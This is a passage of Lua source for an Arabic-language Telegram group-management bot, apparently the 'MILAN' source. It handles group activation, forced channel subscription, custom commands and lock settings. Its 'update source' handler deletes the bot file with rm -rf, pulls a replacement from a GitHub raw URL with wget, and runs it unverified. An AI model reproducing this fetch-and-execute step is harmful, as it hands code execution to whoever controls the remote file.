send(msg.chat_id_, msg.id_,'܁༯┆ههلو ععمري↝ ܰ\n܁༯┆عدد أعضاء المجموعةه قليل يرجئ جمع ◃ {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو ليتم التفعيل ↝ ܰ')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'܁༯┆تم تفعيل المجموعةه مسبقاً ↝ ܰ')
else
sendText(msg.chat_id_,'\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل المجموعة بنجاح ↝ ܰ',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '🔖┇ تم تفعيل مجموعه جديده\n'..
'\n☑️┇ بواسطة {'..Name..'}'..
'\n☑️┇ ايدي المجموعه {`'..IdChat..'`}'..
'\n👥┇ اسم المجموعه {['..NameChat..']}'..
'\n🔖┇عدد اعضاء المجموعه *{'..NumMember..'}*'..
'\n🖇️┇ الرابط {['..LinkGp..']}'
if not SudoBot(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'܁༯┆تم تعطيل المجموعةه مسبقاً ↝ ܰ')
else
sendText(msg.chat_id_,'\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل المجموعة بنجاح ↝ ܰ',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\nتم تعطيل المجموعه ┇🔖'..
'\n☑️┇ بواسطة {'..Name..'}'..
'\n☑️┇ايدي المجموعه {`'..IdChat..'`}'..
'\n👥┇اسم المجموعه {['..NameChat..']}'..
'\n🖇️┇ الرابط {['..LinkGp..']}'
if not SudoBot(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجئ ترقيتي... ! ↝ ܰ') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عدد أعضاء المجموعةه قليل يرجئ جمع ◃ {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو ليتم التفعيل ↝ ܰ')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'܁༯┆تم تفعيل المجموعتك مسبقاً ↝ ܰ')
else
sendText(msg.chat_id_,'\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل المجموعة بنجاح ↝ ܰ',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '🔖┇ تم تفعيل مجموعه جديده\n'..
'\n☑️┇ بواسطة {'..Name..'}'..
'\n👤┇ موقعه في المجموعه {'..AddPy..'}' ..
'\n☑️┇ ايدي المجموعه {`'..IdChat..'`}'..
'\n👥┇ عدد اعضاء المجموعه *{'..NumMember..'}*'..
'\n📝┇ اسم المجموعه {['..NameChat..']}'..
'\n🖇️┇ الرابط {['..LinkGp..']}'
if not SudoBot(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and SudoBot(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](t.me/R_IQ9) عضو ↝ ܰ')
end
if text == 'تحديث السورس' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
os.execute('rm -rf MILAN.lua')
os.execute('wget https://raw.githubusercontent.com/MILANTEAM/MILAN/master/MILAN.lua')
send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
dofile('MILAN.lua')  
end



if text and text:match("^• تغير الاشتراك 𖤩  .$") and SudoBot(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '܁༯┆حسنا ارسل المعرف الان ↝ ܰ') 
return false  
end
if text and text:match("^• تغير رسالة الاشتراك 𖤩  .$") and SudoBot(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '܁༯┆حسنا ارسل النص الذي تريده↝ ܰ') 
return false  
end
if text == "• حذف رسالة الاشتراك 𖤩  ." and SudoBot(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "܁༯┆تم مسح رسالة الاشتراك ↝ ܰ") 
return false  
end
if text and text:match("^• وضع قناة الاشتراك 𖤫  .$") and SudoBot(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '܁༯┆ارسل معرف قناتك ↝ ܰ') 
return false  
end
if text == "• تفعيل الاشتراك 𖤤  ." and SudoBot(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_,"܁༯┆تم تفعيل الاشتراك الاجباري↝ ܰ")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"܁༯┆لايوجد اشتراك اجباري↝ ܰ")
end
return false  
end
if text == "• تعطيل الاشتراك 𖤤  ." and SudoBot(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "܁༯┆تم تعطيل الاشتراك الاجباري ↝ ܰ") 
return false  
end
if text == "• الاشتراك الاجباري 𖤫 ." and SudoBot(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "܁༯┆تم تفعيل الاشتراك الاجباري↝ ܰ")
else
send(msg.chat_id_, msg.id_, "܁༯┆لايوجد قناة في الاشتراك الاجباري  ↝ ܰ ") 
end
return false  
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
Text = [[
༯┆WELCOM BRO ↝ .
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆[Qinat alsuwris](t.me/R_IQ9) 
༯┆[Qinat shuruhat alsuwris](t.me/SourceMilano) 
༯┆[But tuasil](t.me/r_iq6_bot) 
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆ [Mtwr alswrus](t.me/RR40K)  
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع نسخه الاحتياطيه' and SudoBot(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'جلب نسخه الاحتياطيه' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
GetFile_Bot(msg)
end
if text == 'الاوامر المضافه' and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = "٭ 𖤓┆قائمة الاوامر المضافةه↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t.."𖠵 "..k.." ◜"..v.." ◃ "..Cmds.." ◞ .\n"
else
end
end
if #list == 0 then
t = "܁༯┆لايوجد اوامـُر مضافةه ↝ ܰ"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'حذف الاوامر المضافه' or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف جميع الاوامر المضافه ↝ ܰ')  
end
end
if text == 'اضف امر' and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل الامر القديم ↝ ܰ')  
return false
end
if text == 'حذف امر' or text == 'مسح امر' then 
if Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'܁༯┆هلو عمري ↝ ܰ\n܁༯┆ارسل الامر الذي تريد حذفه 𖢟 .')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'܁༯┆قم بارسال الامر الجديد ↝ ܰ')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'܁༯┆تم حفض الامر ܊ قم بالتجربه ܊ ↝ ܰ')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الدردشه ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الاضافه ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الدخول ↝ ܰ ')  
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل البوتات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل البوتات بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الاشعارات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الثبيت ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل التعديل ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الفشار' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الفشار ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)  
elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الانكليزيه ↝ ܰ ')  
end,nil)
elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الاونلاين ↝ ܰ ')  
end,nil)
elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل التعديل الميديا ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل جميع الاوامر ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
end
if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الاونلاين ↝ ')  
end,nil)
elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الاضافه ↝ ܰ ')  
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الدردشه ↝ ܰ ')  
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الدخول ↝ ܰ ')  
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح البوتات ↝ ܰ ')  
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم فتح البوتات بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الاشعارات ↝ ܰ ')  
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم فتح التثبيت ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل التعديل الميديا ↝ ܰ ')  
end,nil)   
elseif text == 'فتح الفشار' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم فتح الفشار ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الانكليزيه ↝ ܰ ')  
end,nil)
elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح التعديل الميديا ↝ ܰ ')  
end,nil)   
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم فتح جميع الاوامر ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الروابط ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الروابط بالتقيد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الروابط بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الروابط بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
